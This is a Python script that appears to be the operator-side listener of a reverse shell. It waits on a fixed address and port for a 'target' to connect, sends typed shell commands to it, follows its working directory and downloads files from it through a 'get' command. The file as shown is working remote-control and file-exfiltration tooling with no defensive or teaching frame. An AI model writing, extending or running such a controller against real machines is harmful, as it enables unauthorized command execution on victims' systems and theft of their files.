import socket
import subprocess
import os

# IP = socket.gethostbyname(socket.gethostname())
IP = "10.0.0.88"
PORT = 12345
BUFFER_SIZE = 4096
HEADERSIZE = 10

def send(conn, data):
	packet = f"{len(data):<{HEADERSIZE}}" + data
	print(f"Sended data: {packet}")
	conn.send(packet.encode("utf-8"))

def recv(conn):
	packet = conn.recv(BUFFER_SIZE).decode("utf-8") #we receive a chunk of size (BUFFER_SIZE) which will have a header and some data
	packetLen = int(packet[:HEADERSIZE]) #we store the len of the full msg
	while True:
		if (len(packet)-HEADERSIZE) < packetLen: #if our packet's length without the header is smaller than the actual full data we keep recv
			packet += conn.recv(BUFFER_SIZE).decode("utf-8")
		else:
			break #we got the full msg so we break out the loop
	return packet

def recvFile(conn, fname):
	foundFile = False
	for file in os.listdir():
		if file == fname:
			foundFile = True
	if not foundFile:
		with open(fname, "wb") as f:
			dataLen = int(conn.recv(BUFFER_SIZE))
			print(f"dataLen:{dataLen}")
			totalRecv = 0
			while totalRecv < dataLen:
				chunk = conn.recv(BUFFER_SIZE)
				totalRecv += len(chunk)
				if chunk:
					f.write(chunk)
				else:
					break
			pass
	else:
		print("File already found . . .")
	
def listen():
	terminate = 'exit' #used for terminating purposes
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Socket of the family AF_INET(IPv4) and TYPE SOCK_STREAM
	"""
	This indicates that we can reuse the socket after closing SOL_SOCKET indicates that we are talking about SOCKET "LEVEL" 
	and socket level has some options we can change i.e. SO_REUSEADDR
	setsockopt method changes SO_REUSEADDR to value 1(True) so we can reuse the socket

	"""
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
	s.bind((IP, PORT)) #Socket will bind IP and PORT for listening
	print(f"Listening for TCP connections at IP {IP} and PORT {PORT}")
	s.listen() #Listening for any upcoming connections (parameter: how many connections is going to listen to)
	conn, addr = s.accept() #s.accept returns a new socket (the endpoint connected to our server) and it's IP
	print(f"[+]:Connected to {addr}")
	path = ""
	path_len = int(conn.recv(HEADERSIZE))
	while len(path) < path_len:
		path += conn.recv(BUFFER_SIZE).decode("utf-8")
	while True:
		command = input(f"{path} >>") #command stores the command we are going to send to our target
		if command == terminate: #if the condition is true we send a disconnection msg for our target so he will try to connect and we close the connect for our server
			send(conn, command) #send terminating msg
			s.close()#close socket
			break
		else:
			if not command: continue #if we do not give a command we are waiting for input again
			send(conn, command)#Send packet (len + data)
			if command[:2] == "cd":
				packet = recv(conn)
				path = packet[HEADERSIZE:]
			elif command[:3] == "get":
				recvFile(conn, command[4:])
			else:
				packet = recv(conn)
				print(packet)

				
	# except Exception as err:
	# 	print(err)
	# 	s.close()


if __name__ == '__main__':
	listen()